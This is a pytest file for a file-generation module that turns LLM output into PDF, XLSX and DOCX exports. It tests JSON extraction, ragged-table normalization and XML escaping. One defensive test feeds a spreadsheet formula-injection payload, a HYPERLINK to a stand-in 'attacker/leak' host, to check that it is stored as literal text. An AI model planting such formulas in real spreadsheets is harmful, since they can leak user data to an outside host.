"""
File generation — the subsystem that used to fail silently.

Guards:
  * JSON extraction survives real LLM output (reasoning tags, markdown fences,
    trailing prose). The old greedy regex grabbed first '{' to last '}'.
  * Ragged LLM tables are normalized, not fatal. Row length != header count
    used to crash pandas (xlsx) and reportlab (pdf).
  * Builders survive ordinary tax text: '&', '<', '>' are XML-special to
    reportlab and used to blow up the whole PDF.
  * Files land on absolute paths, so downloads survive a server started from
    a different working directory.
"""
import os
import zipfile

import openpyxl
import pytest

from src.pipeline.file_structurer import _extract_json, _normalize_payload
from src.generation.pdf_builder import build_pdf
from src.generation.xlsx_builder import build_xlsx
from src.generation.docx_builder import build_docx


# ── JSON extraction ───────────────────────────────────────────────────────────

def test_extracts_bare_json():
    assert _extract_json('{"title": "Rate Card"}')["title"] == "Rate Card"


def test_extracts_json_from_markdown_fence():
    raw = 'Sure, here you go:\n```json\n{"title": "Rate Card"}\n```\nHope that helps!'
    assert _extract_json(raw)["title"] == "Rate Card"


def test_ignores_reasoning_tokens_before_json():
    """Reasoning models emit <think> blocks; braces inside them broke parsing."""
    raw = '<think>The user wants {a table} of rates</think>\n{"title": "Rate Card"}'
    assert _extract_json(raw)["title"] == "Rate Card"


def test_extracts_first_balanced_object_despite_trailing_prose():
    raw = 'Note {not json}. Result: {"title": "X", "nested": {"a": 1}} — done }'
    result = _extract_json(raw)
    assert result["title"] == "X"
    assert result["nested"] == {"a": 1}


@pytest.mark.parametrize("raw", ["", "no json here at all", "{unclosed: "])
def test_unparseable_output_raises_rather_than_returning_garbage(raw):
    """A failure must be loud — silent failure is what hid this bug for versions."""
    with pytest.raises(ValueError):
        _extract_json(raw)


# ── Payload normalization ─────────────────────────────────────────────────────

def test_short_rows_are_padded_to_header_width():
    payload = _normalize_payload({
        "title": "T",
        "sections": [{"type": "table", "headers": ["A", "B", "C"], "rows": [["1", "2"]]}],
    })
    assert payload["sections"][0]["rows"] == [["1", "2", ""]]


def test_long_rows_are_truncated_to_header_width():
    payload = _normalize_payload({
        "title": "T",
        "sections": [{"type": "table", "headers": ["A", "B"], "rows": [["1", "2", "3", "4"]]}],
    })
    assert payload["sections"][0]["rows"] == [["1", "2"]]


def test_headerless_table_synthesizes_headers():
    payload = _normalize_payload({
        "title": "T",
        "sections": [{"type": "table", "headers": [], "rows": [["1", "2"]]}],
    })
    assert payload["sections"][0]["headers"] == ["Column 1", "Column 2"]


def test_non_string_cells_are_coerced():
    payload = _normalize_payload({
        "title": "T",
        "sections": [{"type": "table", "headers": ["A", "B"], "rows": [[None, 15]]}],
    })
    assert payload["sections"][0]["rows"] == [["", "15"]]


def test_missing_title_gets_a_default():
    assert _normalize_payload({})["title"] == "Muhafiz Export"


def test_empty_table_is_dropped_not_crashed():
    """A zero-column table used to produce a corrupt docx table."""
    payload = _normalize_payload({
        "title": "T",
        "sections": [{"type": "table", "headers": [], "rows": []}],
    })
    assert payload["sections"] == []


def test_non_dict_payload_raises():
    with pytest.raises(ValueError):
        _normalize_payload(["not", "a", "dict"])


# ── Builders ──────────────────────────────────────────────────────────────────

@pytest.fixture
def hostile_payload():
    """Ordinary Pakistan Penal Code content — every one of these used to break a builder."""
    return _normalize_payload({
        "title": "Offense & Penalty <Report> 2026",
        "description": "Applies where value < 600,000 & count > 5",
        "sections": [
            {"type": "heading", "level": 2, "content": "PPC & PECA"},
            {"type": "paragraph", "content": "Sections 379 & 411 apply if x < y"},
            {"type": "table", "headers": ["Section", "Punishment"],
             "rows": [["379", "3 years"], ["411", "imprisonment", "extra"], ["420"]]},
        ],
    })


@pytest.mark.parametrize("build", [build_pdf, build_xlsx, build_docx])
def test_builder_handles_special_chars_and_ragged_rows(build, hostile_payload):
    filepath, size = build(hostile_payload)

    assert os.path.isabs(filepath), "storage_path must be absolute for downloads to survive a cwd change"
    assert os.path.exists(filepath)
    assert size > 0
    os.remove(filepath)


def test_pdf_is_a_real_pdf(hostile_payload):
    filepath, _ = build_pdf(hostile_payload)
    with open(filepath, "rb") as f:
        assert f.read(5) == b"%PDF-"
    os.remove(filepath)


@pytest.mark.parametrize("build", [build_xlsx, build_docx])
def test_ooxml_files_are_valid_zip_archives(build, hostile_payload):
    """xlsx/docx are zip containers — a corrupt one fails here, not in Excel."""
    filepath, _ = build(hostile_payload)
    assert zipfile.is_zipfile(filepath)
    os.remove(filepath)


def test_builders_survive_a_payload_with_no_sections():
    filepath, size = build_pdf(_normalize_payload({"title": "Empty"}))
    assert size > 0
    os.remove(filepath)


# ── CWE-1236 formula/CSV injection ───────────────────────────────────────────

def test_xlsx_neutralizes_formula_injection_in_cells_and_headers():
    """A cell starting with =/+/-/@ is a live formula the instant Excel opens
    the file — evidence/LLM-supplied text must never reach openpyxl as-is."""
    payload = _normalize_payload({
        "title": "T",
        "sections": [{
            "type": "table",
            "headers": ["=1+1", "Normal"],
            "rows": [['=HYPERLINK("http://attacker/leak","Click")', "+SUM(A1:A9)"]],
        }],
    })
    filepath, _ = build_xlsx(payload)
    wb = openpyxl.load_workbook(filepath)
    ws = wb.active

    # Every cell that started with a formula-trigger character must be
    # stored as literal text (leading apostrophe), never as a live formula.
    assert ws["A1"].value == "'=1+1"
    assert ws["A1"].data_type == "s"
    assert ws["A2"].value == '\'=HYPERLINK("http://attacker/leak","Click")'
    assert ws["A2"].data_type == "s"
    assert ws["B2"].value == "'+SUM(A1:A9)"
    assert ws["B2"].data_type == "s"

    os.remove(filepath)


def test_xlsx_leaves_ordinary_cells_untouched():
    payload = _normalize_payload({
        "title": "T",
        "sections": [{"type": "table", "headers": ["Section", "Punishment"],
                      "rows": [["379", "3 years"]]}],
    })
    filepath, _ = build_xlsx(payload)
    wb = openpyxl.load_workbook(filepath)
    ws = wb.active
    assert ws["A2"].value == "379"
    assert ws["B2"].value == "3 years"
    os.remove(filepath)
